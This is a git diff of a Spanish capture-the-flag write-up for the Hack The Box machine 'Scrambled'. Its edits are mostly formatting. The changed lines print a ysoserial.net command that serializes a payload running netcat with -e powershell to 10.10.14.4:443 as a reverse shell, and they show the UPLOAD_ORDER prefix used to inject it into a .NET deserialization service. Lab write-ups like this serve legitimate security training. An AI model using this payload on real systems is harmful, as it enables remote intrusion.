@@ -557,11 +557,11 @@ Hay data encodeada en base64, asique probaré a decodificar la última cadena.
 
 La aplicación envía los datos en formato base64 serializado. Entonces, la aplicación realiza la deserialización de su lado.
 
-> `Serialización a Base64`
+> <span style="color:red">Searialización a Base64</span>.
 
 ![](/assets/images/HTB/Scrambled-HackTheBox/serializacion.webp)
 
-> `Desearialización de Base64`
+> <span style="color:red">Desearialización de Base64</span>.
 
 ![](/assets/images/HTB/Scrambled-HackTheBox/deserializacion.webp)
 
@@ -578,7 +578,7 @@ Para poder realizar este payload serializado usaré la herramienta ysoserial.net
 
 Una vez descargada, desde powershell o cmd la ejecutaremos para serializar el payload con el siguiente comando.
 
-> `C:\Users\W10_CFC\Desktop\Release>` .\ysoserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 -c "C:\Temp\netcat.exe -e powershell 10.10.14.4 443"
+> C:\Users\W10_CFC\Desktop\Release> <span style="color:red">.\ysoserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 -c "C:\Temp\netcat.exe -e powershell 10.10.14.4 443" ></span>. 
 
 Y se nos generará serializado.
 
@@ -590,7 +590,7 @@ Una vez serializado nos ponemos en escucha en el puerto 443 (que es el que yo he
 
 En otra ventana en el cmd nos podemos en escucha en el puerto 4411 que es donde se ejecuta la herramienta e introducimos la data serializada de la siguiente forma.
 
-Debemos añadir delante de la data: `UPLOAD_ORDER;<dataserializada>`
+Debemos añadir delante de la data: <span style="color:red">UPLOAD_ORDER;<dataserializada></span>.
 
 ```cmd
 # DATA SERIALIZADA
@@ -614,7 +614,7 @@ Y ya podemos leer la flag root.txt
 
 ![](/assets/images/HTB/Scrambled-HackTheBox/pwned.webp)
 
-Hola <span style="color:red">GRACIAS</span>.
+
 
 
 
